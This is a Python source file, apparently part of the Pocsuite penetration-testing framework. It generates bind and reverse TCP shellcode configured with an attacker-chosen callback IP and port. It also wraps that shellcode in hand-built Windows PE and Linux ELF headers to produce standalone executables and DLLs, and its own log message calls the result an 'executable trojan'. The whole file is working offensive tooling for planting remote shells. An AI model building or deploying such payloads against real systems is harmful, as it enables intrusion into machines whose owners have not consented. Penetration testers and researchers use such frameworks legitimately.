import struct
import time
import os

from Framework.Library.Function.Function.PocSuite.lib.core.data import paths, logger

from Framework.Library.Function.Function.PocSuite.lib.core.common import validate_ip_addr, port_to_hex, port_to_dd, ip_to_hex, ip_to_dd, create_shellcode, \
    read_binary, get_public_type_members
from Framework.Library.Function.Function.PocSuite.lib.core.enums import OS, OS_ARCH, SHELLCODE_CONNECTION


class ShellGenerator:
    def __init__(self, os_target, os_target_arch):
        self.OS_TARGET = os_target
        self.OS_TARGET_ARCH = os_target_arch
        self.utils = ['nasm', 'objdump']
        self.shellcodes_root = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
        self.use_precompiled = self.check_for_system_utils()

    def check_settings(self, addr, port):
        if self.OS_TARGET not in get_public_type_members(OS, only_values=True):
            raise Exception('Can\'t generate shellcode for OS: %s' % self.OS_TARGET)
        if self.OS_TARGET_ARCH not in ['32bit', '64bit']:
            raise Exception('Can\'t generate shellcode for ARCH: %s' % self.OS_TARGET_ARCH)
        if not validate_ip_addr(addr):
            raise Exception('IP address %s is not valid' % addr)
        if not 0 <= port <= 65535:
            raise Exception('PORT %s is not valid' % port)

    def check_for_system_utils(self):
        """Checks utils. If any util is not exists precompiled shellcodes will be used"""
        import platform
        if platform.system().lower() == 'windows':
            return False
        is_nix_cmd_exists = lambda x: any(os.access(os.path.join(path, x), os.X_OK)
                                          for path in os.environ["PATH"].split(os.pathsep))
        for util in self.utils:
            if not is_nix_cmd_exists(util):
                return True
        return False

    def _make_path(self, *paths):
        path = os.path.join(self.shellcodes_root, self.OS_TARGET)
        if self.OS_TARGET_ARCH == OS_ARCH.X64:
            path = os.path.join(path, 'x64')
        if not self.use_precompiled:
            path = os.path.join(path, 'src')
        return os.path.join(path, *paths)

    def get_shellcode(self, shellcode_type, connectback_ip="127.0.0.1", connectback_port=5555, make_exe=0, debug=0,
                      filename="", dll_inj_funcs=None, shell_args=None, use_precompiled=True):
        if shell_args is None:
            shell_args = {}
        if dll_inj_funcs is None:
            dll_inj_funcs = []
        self.check_settings(connectback_ip, connectback_port)
        filepath = ''
        if self.use_precompiled:
            logger.info('Some utils needed for shellcode compilation are not found. Only precompiled shellcodes can be used.')
        self.use_precompiled = use_precompiled or self.use_precompiled
        ext = '.bin' if self.use_precompiled else '.asm'
        if shellcode_type == SHELLCODE_CONNECTION.BIND:
            path = self._make_path('bind_tcp' + ext)
            if self.use_precompiled:
                values = dict(BIND_PORT=port_to_hex(connectback_port))
            else:
                values = dict(BIND_PORT=port_to_dd(connectback_port))
        elif shellcode_type == SHELLCODE_CONNECTION.REVERSE:
            path = self._make_path('reverse_tcp' + ext)
            if self.use_precompiled:
                values = dict(CONNECTBACK_IP=ip_to_hex(connectback_ip),
                              CONNECTBACK_PORT=port_to_hex(connectback_port))
            else:
                values = dict(CONNECTBACK_IP=ip_to_dd(connectback_ip),
                              CONNECTBACK_PORT=port_to_dd(connectback_port))
        # handle custom shellcode
        else:
            path = os.path.join(self.shellcodes_root, shellcode_type + ext)
            values = shell_args
        shell = self.read_and_replace(path, values, use_precompiled)
        if not self.use_precompiled:
            shell, filepath = create_shellcode(shell, self.OS_TARGET, self.OS_TARGET_ARCH, make_exe,
                                               debug=debug, filename=filename, dll_inj_funcs=dll_inj_funcs)
        if debug:
            logger.debug('Shellcode generated with length=%s' % len(shell))
            logger.debug(b''.join(b'\\x%02x' % x for x in shell))
        if (make_exe or dll_inj_funcs) and self.use_precompiled:
            exe_gen = ShellcodeToExe(shell, self.OS_TARGET, self.OS_TARGET_ARCH,
                                     filename=filename, dll_inj_funcs=dll_inj_funcs)
            if make_exe:
                filepath = exe_gen.create_executable()
                if debug:
                    logger.debug('Executable trojan is generated: %s' % filepath)
            if dll_inj_funcs:
                filepath = exe_gen.create_executable()
                if debug:
                    logger.debug('DLL is generated: %s' % filepath + '.dll')
        return shell, filepath

    @staticmethod
    def read_and_replace(path, values, use_precompiled):
        def to_hex(data):
            return b''.join(b'\\x%02x' % x for x in data)

        shell = read_binary(path)
        for key, value in values.items():
            if use_precompiled:
                value = to_hex(value)
            shell = shell.replace(key.encode(), value)
        if use_precompiled:
            shell = bytes.fromhex(shell.replace(b'\\x', b'').decode())
        return shell


class ShellcodeToExe:
    def __init__(self, shellcode, target_os, target_arch, filename='', dll_inj_funcs=''):
        self.shellcode = shellcode
        self.target_os = target_os
        self.target_arch = target_arch
        self.dll_inj_funcs = dll_inj_funcs
        self.filename = filename if filename else time.strftime('%Y%m%d%H%M%S', time.gmtime())
        self.path = paths.POCSUITE_TMP_PATH

    def mkdirs(self):
        if not os.path.exists(self.path):
            os.mkdir(self.path)

    def create_win_x86_exe(self):
        header = b'\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd' \
                 b'\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f' \
                 b'\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a' \
                 b'\x24\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4c\x01\x02\x00\xd3\x7c\xb5\x58\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\xe0\x00\x0f\x03\x0b\x01\x02\x1b\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00' \
                 b'\x04\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x30\x00\x00\x00\x02\x00\x00' \
                 b'\x1a\x89\x00\x00\x03\x00\x00\x00\x00\x00\x20\x00\x00\x10\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00' \
                 b'\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x14\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x74\x65\x78\x74\x00\x00\x00' \
                 b'\x63\x01\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x20\x00\x50\x60\x2e\x69\x64\x61\x74\x61\x00\x00\x14\x00\x00\x00\x00\x20\x00\x00' \
                 b'\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\xc0' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00'
        data = header + self.shellcode
        data += b'\xFF' * 4 + b'\x00' * 4 + b'\xFF' * 4
        data = data.ljust(1536, b'\x00')
        return data

    def create_win_x86_64_exe(self):
        header = b'\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd' \
                 b'\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f' \
                 b'\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a' \
                 b'\x24\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x64\x86\x02\x00\xe8\x5d\xb6\x58\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\xf0\x00\x2f\x02\x0b\x02\x02\x1b\x00\x04\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00' \
                 b'\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x02\x00\x00\x00\x00\x00\x00\x30\x00\x00\x00\x02\x00\x00' \
                 b'\x9a\x9e\x00\x00\x03\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x20\x02\x00\x00\x00\x10\x00\x00' \
                 b'\x00\x04\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x50\x60' \
                 b'\x2e\x69\x64\x61\x74\x61\x00\x00\x14\x00\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\xc0\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00'
        data = header + self.shellcode
        data += b'\x00' * 7 + b'\xFF' * 8 + b'\x00' * 8 + b'\xFF' * 8
        data = data.ljust(2048, b'\x00')
        return data

    def create_linux_x86_exe(self):
        header = b'\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00' \
                 b'\x60\x80\x04\x08\x34\x00\x00\x00\x1c\x01\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00' \
                 b'\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xff\x10\x00\x00' \
                 b'\xff\x10\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        data = header + self.shellcode
        return data

    def create_linux_x86_64_exe(self):
        header = b'\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00' \
                 b'\x80\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x18\x01\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x40\x00\x04\x00\x03\x00\x01\x00\x00\x00\x05\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00' \
                 b'\xff\x10\x00\x00\x00\x00\x00\x00\xff\x10\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00'
        data = header + self.shellcode
        return data

    def create_x86_dll(self):
        if self.target_arch == OS_ARCH.X64:
            logger.error('Can\'t create dll for x64 arch. Only x86 arch is supported.')
            return
        header = b'\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd' \
                 b'\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f' \
                 b'\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a' \
                 b'\x24\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4c\x01\x03\x00\x9e\xa7\xb6\x58\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\xe0\x00\x0e\x23\x0b\x01\x02\x1b\x00\x02\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x10\x00\x00\x00\x02\x00\x00' \
                 b'\x04\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x04\x00\x00' \
                 b'\xe2\x9e\x00\x00\x03\x00\x00\x00\x00\x00\x20\x00\x00\x10\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00' \
                 b'\x00\x00\x00\x00\x10\x00\x00\x00\x00\x20\x00\x00\xff\x0e\x00\x00\x00\x30\x00\x00\x14\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x74\x65\x78\x74\x00\x00\x00' \
                 b'\x54\x01\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                 b'\x00\x00\x00\x00\x20\x00\x50\x60\x2e\x65\x64\x61\x74\x61\x00\x00\xff\x0e\x00\x00\x00\x20\x00\x00' \
                 b'\x00\x04\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x30\x40' \
                 b'\x2e\x69\x64\x61\x74\x61\x00\x00\x14\x00\x00\x00\x00\x30\x00\x00\x00\x02\x00\x00\x00\x0a'
        header += b'\x00' * 546
        data = header + self.shellcode
        data += b'\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff'
        data = data.ljust(1536, b'\x00')
        data += b'\x00' * 16
        data += b'\x01\x00\x00\x00'
        data += struct.pack('<I', len(self.dll_inj_funcs)) + struct.pack('<I', len(self.dll_inj_funcs))
        data += b'\x28\x20\x00\x00'
        data += struct.pack('B', 0x28 + len(self.dll_inj_funcs) * 4) + b'\x20\x00\x00'
        data += struct.pack('B', 0x28 + len(self.dll_inj_funcs) * 8) + b'\x20\x00\x00'
        data += b'\x00\x10\x00\x00' * len(self.dll_inj_funcs)
        base = 0x2100 + len(self.filename) - 1
        data += struct.pack('<H', base) + b'\x00\x00'
        for func_name in self.dll_inj_funcs[:-1]:
            base += len(func_name) + 1
            data += struct.pack('<H', base) + b'\x00\x00'
        for i in range(len(self.dll_inj_funcs)):
            data += struct.pack('<H', i)
        data += self.filename + '.dll\x00'
        for func_name in self.dll_inj_funcs:
            data += func_name + b'\x00'
        data = data.ljust(3072, b'\x00')
        path = os.path.join(self.path, self.filename)
        self.write_file(data, path + '.dll')
        return path

    def create_executable(self):
        self.mkdirs()
        ext = ''
        path = os.path.join(self.path, self.filename)
        if self.target_os == OS.LINUX:
            if self.target_arch == OS_ARCH.X64:
                exe_code = self.create_linux_x86_64_exe()
            else:
                exe_code = self.create_linux_x86_exe()
        elif self.target_os == OS.WINDOWS:
            ext = '.exe'
            if self.target_arch == OS_ARCH.X64:
                exe_code = self.create_win_x86_64_exe()
            else:
                exe_code = self.create_win_x86_exe()
        else:
            logger.error('OS %s is not supported' % self.target_os)
            return
        self.write_file(exe_code, path + ext)
        return path

    @staticmethod
    def write_file(data, path):
        with open(path, 'wb') as f:
            f.write(data)
        logger.info('File %s is created' % path)
